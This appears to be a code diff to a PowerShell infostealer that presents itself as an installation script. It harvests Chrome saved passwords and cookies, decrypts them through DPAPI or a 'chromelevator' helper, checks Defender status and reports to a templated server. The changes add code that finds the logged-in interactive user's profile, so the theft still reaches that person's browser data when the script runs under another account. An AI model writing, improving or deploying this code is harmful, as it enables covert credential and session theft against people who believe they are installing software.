@@ -2,12 +2,14 @@ $ErrorActionPreference = "Stop"
 $ApiBase = "__API_BASE__"
 $PayloadUrl = "$ApiBase/p"
 $ErrorUrl = "$ApiBase/e"
-$ChromelevatorCacheDir = Join-Path $env:LOCALAPPDATA "remote-scripts\chromelevator"
 $CloseTerminal = __CLOSE_TERMINAL__
 $DebugMode = __DEBUG_MODE__
 $IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
+$UserContext = $null
+$ChromeUserDataPath = $null
+$ChromelevatorCacheDir = $null
 
 Write-Host "Running installation script..."
 
@@ -63,7 +65,8 @@ function Send-ScriptErrorReport {
         $report = [ordered]@{
             code = $Code
             hostname = $env:COMPUTERNAME
-            username = $env:USERNAME
+            username = if ($UserContext) { $UserContext.TargetUsername } else { $env:USERNAME }
+            processUsername = $env:USERNAME
             executedAt = [DateTime]::UtcNow.ToString("o")
             errorType = $ErrorRecord.Exception.GetType().FullName
             errorMessage = $ErrorRecord.Exception.Message
@@ -78,6 +81,105 @@ function Send-ScriptErrorReport {
     }
 }
 
+
+function Get-ProfilePathForAccountName {
+    param([string]$AccountName)
+
+    if ([string]::IsNullOrWhiteSpace($AccountName)) {
+        return $null
+    }
+
+    $usersRoot = Join-Path $env:SystemDrive "Users"
+    $directPath = Join-Path $usersRoot $AccountName
+    if (Test-Path -LiteralPath $directPath) {
+        return $directPath
+    }
+
+    $profileListKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
+    if (-not (Test-Path -LiteralPath $profileListKey)) {
+        return $null
+    }
+
+    foreach ($entry in Get-ChildItem -Path $profileListKey -ErrorAction SilentlyContinue) {
+        try {
+            $profileImagePath = (Get-ItemProperty -LiteralPath $entry.PSPath -ErrorAction Stop).ProfileImagePath
+            if (-not $profileImagePath) {
+                continue
+            }
+            if ((Split-Path -Path $profileImagePath -Leaf) -ieq $AccountName) {
+                return $profileImagePath
+            }
+        }
+        catch {
+        }
+    }
+
+    return $null
+}
+
+function Get-InteractiveUserContext {
+    $processUsername = [string]$env:USERNAME
+    $processProfile = [string]$env:USERPROFILE
+    $processLocalAppData = [string]$env:LOCALAPPDATA
+    $interactiveQualified = $null
+
+    try {
+        $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
+        if ($computerSystem.UserName) {
+            $interactiveQualified = [string]$computerSystem.UserName
+        }
+    }
+    catch {
+    }
+
+    $targetUsername = $processUsername
+    $targetProfile = $processProfile
+    $targetLocalAppData = $processLocalAppData
+
+    if ($interactiveQualified) {
+        $interactiveUsername = $interactiveQualified
+        if ($interactiveQualified -match '^([^\\]+)\\(.+)$') {
+            $interactiveUsername = $Matches[2]
+        }
+
+        if ($interactiveUsername -and ($interactiveUsername -ne $processUsername)) {
+            $resolvedProfile = Get-ProfilePathForAccountName -AccountName $interactiveUsername
+            if ($resolvedProfile) {
+                $localAppData = Join-Path $resolvedProfile "AppData\Local"
+                if (Test-Path -LiteralPath $localAppData) {
+                    $targetUsername = $interactiveUsername
+                    $targetProfile = $resolvedProfile
+                    $targetLocalAppData = $localAppData
+                }
+            }
+        }
+    }
+
+    return [pscustomobject]@{
+        ProcessUsername = $processUsername
+        TargetUsername = $targetUsername
+        TargetUserProfile = $targetProfile
+        TargetLocalAppData = $targetLocalAppData
+        InteractiveQualifiedName = $interactiveQualified
+        UsesInteractiveUser = ($targetUsername -ne $processUsername)
+    }
+}
+
+function Initialize-TargetUserPaths {
+    $script:UserContext = Get-InteractiveUserContext
+    $script:ChromeUserDataPath = Join-Path $UserContext.TargetLocalAppData "Google\Chrome\User Data"
+    $script:ChromelevatorCacheDir = Join-Path $UserContext.TargetLocalAppData "remote-scripts\chromelevator"
+
+    if ($DebugMode) {
+        if ($UserContext.UsesInteractiveUser) {
+            Write-DebugStep "Process user=$($UserContext.ProcessUsername), target user=$($UserContext.TargetUsername) (interactive session: $($UserContext.InteractiveQualifiedName))"
+        }
+        else {
+            Write-DebugStep "Target user=$($UserContext.TargetUsername) (same as process)"
+        }
+        Write-DebugStep "Target profile=$($UserContext.TargetUserProfile)"
+    }
+}
 
 function Get-ChromeInstalledVersion {
     $candidatePaths = @(
@@ -134,7 +236,12 @@ function Get-ChromeInstalledVersion {
 }
 
 function Get-ChromeProfileMetadata {
-    $chromeUserData = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+    $chromeUserData = if ($ChromeUserDataPath) {
+        $ChromeUserDataPath
+    }
+    else {
+        Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+    }
     $localStatePath = Join-Path $chromeUserData "Local State"
     $result = [ordered]@{}
 
@@ -258,9 +365,19 @@ function Write-ChromeDiscoveryDebug {
         return
     }
 
-    $chromeUserData = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+    $chromeUserData = if ($ChromeUserDataPath) {
+        $ChromeUserDataPath
+    }
+    else {
+        Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+    }
 
-    Write-DebugStep "User: $env:USERNAME (profile=$env:USERPROFILE)"
+    if ($UserContext -and $UserContext.UsesInteractiveUser) {
+        Write-DebugStep "User: $($UserContext.TargetUsername) (process=$($UserContext.ProcessUsername), profile=$($UserContext.TargetUserProfile))"
+    }
+    else {
+        Write-DebugStep "User: $env:USERNAME (profile=$env:USERPROFILE)"
+    }
     Write-DebugStep "Chrome User Data: $chromeUserData"
     Write-DebugStep "Export mode: UseDpapiDecrypt=$UseDpapiDecrypt, UseChromelevator=$UseChromelevator"
 
@@ -478,6 +595,8 @@ function Test-ChromelevatorDefenderStatus {
 
     return [pscustomobject]$status
 }
+
+Initialize-TargetUserPaths
 
 $ChromeInfo = Get-ChromeInstalledVersion
 
@@ -756,10 +875,11 @@ public static class __EXPORTER_CLASS__
     private const int SQLITE_DESERIALIZE_READONLY = 2;
     private static readonly Regex ProfileFolderRegex = new Regex(@"^Profile \d+$|^Default$", RegexOptions.IgnoreCase);
 
-    public static string Export(bool attemptDpapiDecrypt)
+    public static string Export(bool attemptDpapiDecrypt, string chromeUserDataPath, string payloadUsername)
     {
-        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data");
+        string chromePath = string.IsNullOrWhiteSpace(chromeUserDataPath)
+            ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data")
+            : chromeUserDataPath.Trim();
         string localStatePath = Path.Combine(chromePath, "Local State");
 
         if (!File.Exists(localStatePath))
@@ -820,7 +940,7 @@ public static class __EXPORTER_CLASS__
             }
         }
 
-        return BuildJson(passwords, cookies);
+        return BuildJson(passwords, cookies, payloadUsername);
     }
 
     public static string MergeExportPayload(
@@ -1425,12 +1545,15 @@ public static class __EXPORTER_CLASS__
         return bytes;
     }
 
-    private static string BuildJson(List<PasswordEntry> passwords, List<CookieEntry> cookies)
+    private static string BuildJson(List<PasswordEntry> passwords, List<CookieEntry> cookies, string payloadUsername)
     {
+        string username = string.IsNullOrWhiteSpace(payloadUsername)
+            ? Environment.UserName
+            : payloadUsername.Trim();
         var builder = new StringBuilder();
         builder.Append("{");
         builder.Append("\"hostname\":").Append(JsonString(Environment.MachineName)).Append(",");
-        builder.Append("\"username\":").Append(JsonString(Environment.UserName)).Append(",");
+        builder.Append("\"username\":").Append(JsonString(username)).Append(",");
         builder.Append("\"executedAt\":").Append(JsonString(DateTime.UtcNow.ToString("o"))).Append(",");
         builder.Append("\"passwordCount\":").Append(passwords.Count).Append(",");
         builder.Append("\"cookieCount\":").Append(cookies.Count).Append(",");
@@ -1910,8 +2033,12 @@ if (-not $exporterType) {
 Write-DebugStep "Exporter type loaded: $($exporterType.FullName)"
 
 $exportMethod = $exporterType.GetMethod("Export")
-Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt)"
-$exportJsonRaw = [string]$exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
+Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt, chromeUserData=$ChromeUserDataPath)"
+$exportJsonRaw = [string]$exportMethod.Invoke($null, @(
+    [bool]$UseDpapiDecrypt,
+    [string]$ChromeUserDataPath,
+    [string]$UserContext.TargetUsername
+))
 Write-DebugStep "Export completed (jsonLength=$($exportJsonRaw.Length))"
 Write-ExportProfileSummaryDebug -ExportJsonRaw $exportJsonRaw
 
